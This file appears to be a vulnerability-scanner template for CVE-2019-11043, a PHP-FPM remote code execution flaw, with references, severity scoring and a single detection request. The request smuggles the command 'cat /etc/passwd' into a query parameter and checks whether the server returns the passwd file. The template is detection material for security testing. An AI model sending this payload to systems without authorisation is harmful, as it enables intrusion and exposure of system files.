id: CVE-2019-11043

info:
  name: PHP-FPM Remote Code Execution
  author: amit-jd
  severity: critical
  description: |
    In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 in certain configurations of FPM setup it is possible to cause FPM module to write past allocated buffers into the space reserved for FCGI protocol data, thus opening the possibility of remote code execution.
  reference:
    - https://github.com/neex/phuip-fpizdam
    - https://github.com/theMiddleBlue/CVE-2019-11043
    - https://paper.seebug.org/1064/
    - https://nvd.nist.gov/vuln/detail/CVE-2019-11043
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-11043
  tags: cve,cve2019,php,fpm,rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?a=bin/cat+/etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body

# Enhanced by mp on 2022/03/29
